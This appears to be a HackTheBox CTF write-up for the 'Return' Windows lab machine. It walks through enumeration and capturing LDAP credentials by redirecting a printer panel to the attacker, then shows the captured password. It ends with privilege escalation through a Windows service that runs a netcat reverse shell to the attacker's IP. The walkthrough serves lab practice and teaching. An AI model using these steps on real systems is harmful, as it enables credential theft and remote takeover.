---
layout: post
title: Return - HackTheBox
date: 2025-01-01
category: CTF
tags:
  - HackTheBox
  - Active Directory
  - Privilege Escalation
platform: HackTheBox
cover_image: /assets/return_cover.png
post_type: writeup
---

# Return - HackTheBox

**Description:** Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by redirecting the LDAP connection to an attacker-controlled machine, leading to initial foothold and ultimately privilege escalation through service abuse.

---

## Walkthrough

### Initial Enumeration

We start with the basic nmap scan, which is done with default scripts and enumerate versions (it is good practice to scan all of the ports after initial scan is finished, in order to avoid interference between scans). From open ports like Kerberos (88), LDAP/LDAPS (389, 636) and Global Catalog ones, we can see that we are indeed dealing with the Active Directory environment.

```bash
└─$ sudo nmap -sC -sV -oA nmap/nmap-initial 10.10.11.108   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 22:44 CET
Nmap scan report for return.local (10.10.11.108)
Host is up (0.049s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-01 22:03:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m33s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-01T22:03:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.18 seconds
```

LDAP reveals us the domain name which is `return.local`, so we add that to our hosts file. We could also check that with the NetExec tool (updated version of famous CrackMapExec).

```bash
└─$ nxc ldap 10.10.11.108                                        
LDAP        10.10.11.108    389    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
```

### Website Overview

Usually, we would start with the SMB enumeration, but from the nmap scan we can see that there is website hosted on port 80, so we take a look at it.

![/img/return.png](/assets/return.png)

![/img/return1.png](/assets/return1.png)

There is settings panel at the `http://return.local/settings.php`, which seems at first to reveals the password, but those are just asterix symbols, that we cannot "decrypt" using the inspect element from the browser. Therefore, we intercept the request with the Burp Suite, and take a look at the request.

![/img/return2.png](/assets/return2.png)

Here, we could see that we are most likely not dealing with any misconfigured user input validation, but rather we should focus on redirecting traffic onto our machine. Therefore in this POST request, we change the `ip` field, from `ip=printer.return.local`, to our AttackBox (`ip=<our tun0>`). Before forwarding request, we make sure to setup the listener. Here we have two options. The first one is to setup the `responder`, which is tool mostly used for AD attacks, or we can rather listen with `netcat` on port `389`.

### Capturing Traffic with Responder

```bash
└─$ sudo responder -I tun0                                                                                                                                                                                                                                                                                                                                                                                               
                                         __                                                                                                                                                                                                                                                                                                                                                                              
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                                                                                                                                                                                                                                                                 
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                                                                                                                                                                                                                                                                 
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                                                                                                                                                                                                                                                                   
                   |__|                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                         
           NBT-NS, LLMNR & MDNS Responder 3.1.5.0                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                         
  To support this project:                                                                                                                                                                                                                                                                                                                                                                                               
  Github -> https://github.com/sponsors/lgandx                                                                                                                                                                                                                                                                                                                                                                           
  Paypal  -> https://paypal.me/PythonResponder                                                                                                                                                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                                                                                                                                                                                                         
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                                                                                                                                                                                                                                                                                      
  To kill this script hit CTRL-C                   
                                                    
                                                    
[+] Poisoners:                              
    LLMNR                      [ON]               
    NBT-NS                     [ON]                
    MDNS                       [ON]                                                                   
    DNS                        [ON]                                                                   
    DHCP                       [OFF]               
                                                    
[+] Servers:                                       
    HTTP server                [ON]             
    HTTPS server               [ON]                
    WPAD proxy                 [OFF]       
    Auth proxy                 [OFF]                                                                                
    SMB server                 [ON]                
    Kerberos server            [ON]                
    SQL server                 [ON]                                                                   
    FTP server                 [ON]                                                                                 
    IMAP server                [ON]                
    POP3 server                [ON]                       
    SMTP server                [ON]                       
    DNS server                 [ON]                       
    LDAP server                [ON]                       
    MQTT server                [ON]                                                                                                                                                                                                      
    RDP server                 [ON]                                                                                                                                                                         
    DCE-RPC server             [ON]                                              
    WinRM server               [ON]                                                                                                                                
    SNMP server                [OFF]                                             
                                                                                 
[+] HTTP Options:                                                                
    Always serving EXE         [OFF]                                                                                                                                                                                                                                                                                                   
    Serving EXE                [OFF]                                                                                                                                                                                                                                                                                                   
    Serving HTML               [OFF]                                                                                                                                                                        
    Upstream Proxy             [OFF]                                             
                                                                                 
[+] Poisoning Options:                                                           
    Analyze Mode               [OFF]                                                                  
    Force WPAD auth            [OFF]                                                                  
    Force Basic Auth           [OFF]                                                                  
    Force LM downgrade         [OFF]                                                                  
    Force ESS downgrade        [OFF]                                                                  

[+] Generic Options:                                                                                  
    Responder NIC              [tun0]                                                                 
    Responder IP               [10.10.14.30]                                                          
    Responder IPv6             [dead:beef:2::101c]                                                    
    Challenge set              [random]                                                               
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']                                                             
    TTL for poisoned response  [default]                                                              

[+] Current Session Variables:                                                                        
    Responder Machine Name     [WIN-OEAT5R0QNWT]                                                      
    Responder Domain Name      [8ICJ.LOCAL]                                                           
    Responder DCE-RPC Port     [45361]                                                                

[+] Listening for events...
```

After forwarding the request, we obtain the following credentials:

```bash
┌──(kali㉿kali)-[/usr/share/responder/logs]                                      
└─$ cat LDAP-Cleartext-ClearText-10.10.11.108.txt                                
b'return\\svc-printer':b'1edFg43012!!'
```

### Initial Foothold and Enumeration

The first thing I do after obtaining valid credentials, would usually be password spraying against other users in domain. Since we do not have any specific list of target users, I proceed to check different protocols with existing credentials.

```bash
└─$ nxc smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [*] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 
                                                                                                                                                                    
┌──(kali㉿kali)-[~/HTB/return]
└─$ nxc winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'       
WINRM       10.10.11.108    5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

### User Flag

From here it is pretty straightforward, that we can use Evil-WinRM, which utilizes the PowerShell Remoting Protocol (PSRP), enabling remote command execution and management tasks on Windows systems.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> Get-Content user.txt | ForEach-Object { $_.Substring(0, 5) }
57dd1
```

### Abusing Malicious Service

Obtained user, `svc-printer`, has some interesting privileges enabled.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

I have been stuck at this point for a little bit, since it seems that many easy paths would lead into Administrator shell, and compromise, but in this case, the good hint would be to take a look at the services.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> services                                                                                                             
                                                                                                                                                                   
Path                                                                                                                 Privileges Service                            
----                                                                                                                 ---------- -------                            
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS                               
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796                      
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing                  
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost                           
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense                              
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller                   
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService                      
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools                            
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc                           
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend                          
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

From this point, we will proceed to reconfigure a Windows service that we can start and restart, leveraging our administrative privileges. The objective is to establish a reverse shell connection back to our machine, which allows us to execute commands remotely. To facilitate this, we need to ensure that

### Steps to Reconfigure a Service

We will use the **`upload`** feature of **Evil-WinRM** to transfer the **`nc.exe`** (Netcat) executable to the victim's machine. This tool will be essential for establishing the reverse shell connection.

Next, we will reconfigure existing service using the **`sc.exe`** command. This service will be configured to execute Netcat with the command that initiates a reverse shell back to our attacker's machine.

```powershell
sc.exe create vss binpath= "C:\Temp\nc.exe -e cmd.exe 10.10.14.30 5556"
```

- **`vss`** is the name of the service we are abusing.
- The **`binpath`** specifies the path to **`nc.exe`** and includes parameters that define how Netcat should operate, including the attacker's IP address (**`10.10.14.30`**) and port (**`5556`**) for the reverse shell connection.

We also setup the listener on our machine:

```bash
nc -lvnp 5556
```

Finally, we will execute the command on the victim's machine to start the newly reconfigured service:

```powershell
sc.exe start vss
```

On our netcat listener, we got the reverse shell connection, and from here we can leak the `root.txt`.

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
c327fe61e0bc79d**********
```
